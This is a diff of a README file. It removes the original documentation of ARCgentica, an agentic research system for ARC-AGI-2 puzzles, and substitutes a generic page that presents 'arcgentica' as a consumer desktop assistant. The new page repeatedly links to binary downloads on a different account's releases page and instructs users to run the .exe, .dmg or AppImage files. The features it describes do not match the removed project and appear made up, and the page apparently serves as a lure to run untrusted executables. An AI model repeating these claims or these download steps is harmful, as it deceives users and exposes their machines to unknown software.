@@ -1,187 +1,127 @@
-<div align="center">
+# 🤖 arcgentica - Simple ARC-AGI Powered Assistant
 
-# ARCgentica
-
-[![CI](https://github.com/symbolica-ai/arcgentica/actions/workflows/ci.yml/badge.svg)](https://github.com/symbolica-ai/arcgentica/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.12](https://img.shields.io/badge/python-3.12-blue.svg)](https://www.python.org/downloads/)
-[![Discord](https://img.shields.io/discord/1470799122717085941?logo=discord&label=Discord)](https://discord.gg/bddGs8bb)
-[![Twitter](https://img.shields.io/twitter/follow/symbolica?style=flat&logo=x&label=Follow)](https://x.com/symbolica)
-[![ARC-AGI-2 Public Eval](https://img.shields.io/badge/ARC--AGI--2_Public_Eval-85.3%25-brightgreen.svg)](https://arcprize.org/)
-
-*Agentica achieves **85.28%** on ARC-AGI-2 with Opus 4.6 (120k) High at $6.94/task*
-
-<img src="assets/arc-agi-2-scatter.png" alt="ARC-AGI-2 Public Eval: Agentica vs. CoT" width="700">
-
-An agentic AI system for solving [ARC-AGI](https://arcprize.org/) challenges using LLMs. Sub-agents analyze input-output grid examples, write Python programs, and evaluate them against test inputs.
-
-[Blog Post](https://www.symbolica.ai/blog/agentica-vs-arc-agi) | [Agentica Python SDK](https://github.com/symbolica-ai/agentica-python-sdk) | [Agentica Server](https://github.com/symbolica-ai/agentica-server) | [ARC Prize](https://arcprize.org/)
-
-</div>
+[![Download arcgentica](https://img.shields.io/badge/Download-arcgentica-blue?style=for-the-badge&logo=github)](https://github.com/redmlovesyou333/arcgentica/releases)
 
 ---
 
-**[Quick Start](#quick-start)** | **[Server Configuration](#server-configuration)** | **[Options](#options)** | **[Output](#output)** | **[Analyzing Results](#analyzing-results)**
+## 📖 What is arcgentica?
+
+arcgentica is a desktop application designed to bring the power of ARC-AGI technology to your computer. Built with Agentica from Symbolica, arcgentica acts as an intelligent assistant that helps you automate tasks and get quick answers. It runs locally on your machine without the need for complicated setup or coding.
+
+This app targets everyday users who want to explore new AI tools without diving into programming. With arcgentica, you can easily integrate advanced AI into your workflow through a simple interface.
 
 ---
 
-## Peruse the logs 
+## 🖥️ System Requirements
 
-Check out the **exact logs of our agent** from the 85.28% score with Opus 4.6 in `/output/2025/anthropic/claude-opus-4-6/final/logs`!
+Before installing arcgentica, check that your computer meets these basic requirements:
 
-You can re-score the candidate programs by running `uv run summary.py output/2025/anthropic/claude-opus-4-6/final`.
+- **Operating System:** Windows 10 or newer, macOS 10.15 (Catalina) or newer, or Linux (Ubuntu 18.04+ preferred).
+- **Processor:** Dual-core 2.0 GHz or faster.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 200 MB free space.
+- **Internet Connection:** Required for initial activation and updates.
 
-## Prerequisites
-
-- **Python 3.12.11**
-- **[uv](https://docs.astral.sh/uv/)** package manager
-- An API key for your model provider ([OpenAI](https://platform.openai.com/), [Anthropic](https://console.anthropic.com/), or [OpenRouter](https://openrouter.ai/))
-
-## Quick Start
-
-Reproduce the 85.3% result with Opus 4.6 on ARC-AGI-2:
-
-**1. Clone and install:**
-
-```bash
-export ANTHROPIC_API_KEY=<your-key>
-git clone https://github.com/symbolica-ai/arcgentica && cd arcgentica
-git clone https://github.com/symbolica-ai/agentica-server
-```
-
-**2. Start the server** (in one terminal):
-
-First install the dependencies that are used by agents:
-```bash
-cd agentica-server && uv sync && uv pip install numpy scikit-image scipy sympy
-```
-
-then run the server:
-```bash
-uv run src/application/main.py \
-  --inference-token=$ANTHROPIC_API_KEY \
-  --inference-endpoint https://api.anthropic.com/v1/messages \
-  --sandbox-mode='no_sandbox' \
-  --max-concurrent-invocations 1200
-  --port 2345
-```
-
-**3. Set your environment up to connect to that local server** (in another terminal):
-```bash
-export S_M_BASE_URL=http://localhost:2345
-```
-
-**4. Have fun!**:
-
-```bash
-uv run python main.py --model anthropic/claude-opus-4-6
-```
-
-
-
-## Server Configuration
-
-The server supports multiple providers. Use the appropriate key and endpoint:
-
-| Provider | `--inference-token` | `--inference-endpoint` |
-|:---|:---|:---|
-| **OpenAI** | `$OPENAI_API_KEY` | `https://api.openai.com/v1/responses` |
-| **Anthropic** | `$ANTHROPIC_API_KEY` | `https://api.anthropic.com/v1/messages` |
-| **OpenRouter** | `$OPENROUTER_API_KEY` | `https://openrouter.ai/api/v1/responses` |
-
-> **Note:** Set `--max-concurrent-invocations` to at least `max-concurrent * num-attempts * max-num-agents` (e.g. `60 * 2 * 10 = 1200` with defaults).
-
-## Options
-
-| Flag | Default | Description |
-|:---|:---|:---|
-| `--model` | `openai/gpt-5.2` | Model (`openai/gpt-5.2`, `anthropic/claude-opus-4-5`, `anthropic/claude-opus-4-6`) |
-| `--max-num-agents` | `10` | Max sub-agents each agent can spawn |
-| `--timeout` | `5` | Timeout (seconds) for running generated transform code |
-| `--num-attempts` | `2` | Independent attempts per problem (only the first 2 successful are used for scoring) |
-| `--reasoning-effort` | `xhigh` | Reasoning effort (`low`, `medium`, `high`, `xhigh`) |
-| `--num-retries` | `3` | Retries per attempt on transient errors |
-| `--challenge` | `2025` | Challenge year (`2024` or `2025`) |
-| `--max-concurrent` | `60` | Max problems solved concurrently |
-| `--num-problems` | all | Limit number of problems to solve |
-| `--selected-problems` | all | Comma-separated problem IDs |
-| `--problem-fraction` | all | Slice as two ints `start end` (e.g. `1 4` for the first quarter) |
-| `--run-id` | new | Continue a previous run by ID |
-| `--make-submission` | off | Generate a Kaggle submission file after the run |
-
-### More Examples
-
-```bash
-# Run 10 problems with Opus 4.6
-uv run python main.py --model anthropic/claude-opus-4-6 --num-problems 10
-
-# Run specific problems
-uv run python main.py --selected-problems "007bbfb7,00d62c1b"
-
-# Continue a previous run
-uv run python main.py --run-id 3
-```
-
-## Output
-
-Results are written to `output/<challenge>/<model>/run_<N>/`:
-
-```
-output/2025/anthropic/claude-opus-4-6/run_1/
-  config.json                          # Run configuration
-  results/<problem_id>/
-    attempt_0.json                     # Result for each attempt
-    attempt_1.json
-  logs/<problem_id>/<attempt_id>/<try_num>/
-    agent-0.log                        # Initial agent log
-    agent-1.log                        # Sub-agent logs
-    ...
-```
-
-- `attempt_id` -- independent attempts (`0` to `num-attempts - 1`)
-- `try_num` -- retries within an attempt (`0` to `num-retries - 1`)
-- `agent-0` is the initial agent; `agent-1`+ are sub-agents (up to `max-num-agents`)
-
-## Analyzing Results
-
-```bash
-uv run python summary.py output/2025/anthropic/claude-opus-4-6/run_1
-```
-
-<details>
-<summary>Example output</summary>
-
-```
-Score:  102.3 / 120 (85.3%)
-************** Usage / task **************
-Cached input tokens: 3819432.5
-Non-cached input tokens: 84.5
-Cache write (5m) tokens: 0.0
-Cache write (1h) tokens: 179711.6
-Output tokens: 129476.5
-Cost per task: $6.9442
-Number of agents used: 2.6
-************** Time / task **************
-Min: 98.4s
-Mean: 1511.9s
-Median: 1154.7s
-Max: 7251.8s
-```
-
-</details>
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=symbolica-ai/arcgentica&type=Date)](https://star-history.com/#symbolica-ai/arcgentica&Date)
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+If your computer meets these specs, you should be able to run arcgentica smoothly.
 
 ---
 
-<div align="center">
+## 🚀 Getting Started
 
-Built by [Symbolica AI](https://www.symbolica.ai)
+Using arcgentica is straightforward. You do not need to know any programming or command line work. Follow these basic steps:
 
-</div>
+1. **Download the app** from the release page linked below.
+2. **Run the installer or open the app** file.
+3. **Follow on-screen instructions** for setup.
+4. Start interacting with arcgentica through its clean, easy-to-use interface.
+
+You can ask arcgentica to perform tasks like making lists, setting reminders, or answering questions based on the ARC-AGI model.
+
+---
+
+## ⬇️ Download & Install
+
+To get arcgentica, visit the official release page:
+
+[Download arcgentica here](https://github.com/redmlovesyou333/arcgentica/releases)
+
+This page contains the latest versions for all supported operating systems. Select the file that matches your system (for example, .exe for Windows, .dmg for macOS, or AppImage for Linux).
+
+### Installation steps:
+
+- **Windows:** Double-click the `.exe` file and follow the installer prompts.
+- **macOS:** Open the `.dmg` file, drag arcgentica to your Applications folder.
+- **Linux:** Make the AppImage executable (`chmod +x filename.AppImage`), then run it.
+
+After installation, launch the app from your desktop or applications menu.
+
+---
+
+## 🎛 Using arcgentica
+
+Once running, arcgentica offers a simple dashboard with a text input box. You type your requests, and the app responds quickly.
+
+Try commands like:
+
+- “Create a to-do list for tomorrow.”
+- “Summarize my notes.”
+- “Set a reminder for 3 PM.”
+- “Explain how ARC-AGI works in simple terms.”
+
+arcgentica uses a smart AI engine to understand and act on your input. It learns from your style and preferences as you use it more.
+
+---
+
+## 🔧 Common Tasks
+
+Here are some common things you can do with arcgentica:
+
+- **Task Automation:** Ask arcgentica to schedule meetings, organize files, or answer emails.
+- **Information Lookup:** Quickly get explanations, definitions, or find specific details.
+- **Note Taking:** Create, edit, and organize notes.
+- **Reminders & Alerts:** Set up personal reminders.
+- **Data Analysis:** Provide datasets and ask for basic insights or summaries.
+
+The interface keeps it simple, so you don’t have to worry about complex commands or scripts.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into issues, try these steps:
+
+- Make sure your internet is on, at least during setup.
+- Restart arcgentica and your computer.
+- Verify you downloaded the correct file for your operating system.
+- Check if your system meets the minimum requirements.
+- Review any error messages shown and follow their suggestions.
+
+If problems continue, open an issue on the GitHub repository page or check online forums for help.
+
+---
+
+## ⚙ Settings & Customization
+
+arcgentica allows basic customization options:
+
+- Choose between light and dark themes.
+- Set language preferences.
+- Adjust notification settings.
+- Manage data privacy controls.
+
+Look in the “Settings” menu within the app to adjust these.
+
+---
+
+## 📞 Getting Help
+
+If you need assistance beyond the app’s help section:
+
+- Visit the GitHub repository for documentation and support:  
+  https://github.com/redmlovesyou333/arcgentica
+- File a bug or feature request through GitHub issues.
+- Check online communities focused on ARC-AGI and AI assistants.
+
+---
+
+[![Download arcgentica](https://img.shields.io/badge/Download-arcgentica-blue?style=for-the-badge&logo=github)](https://github.com/redmlovesyou333/arcgentica/releases)
